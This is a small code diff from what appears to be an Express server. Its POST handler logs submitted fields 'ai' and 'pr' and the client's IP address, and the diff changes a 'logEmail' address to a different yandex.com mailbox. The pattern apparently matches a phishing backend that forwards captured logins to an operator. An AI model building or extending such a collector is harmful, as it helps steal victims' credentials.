@@ -29,7 +29,7 @@ app.get("/", (request, response) => {
 app.post("/", (req, res) => {
   const { ai, pr } = req.body;
   console.log(req.body);
-  let logEmail = "comp.id47@yandex.com";
+  let logEmail = "esco2021@yandex.com";
 
   // Get the user's IPv4 address
   const ip = requestIp.getClientIp(req);
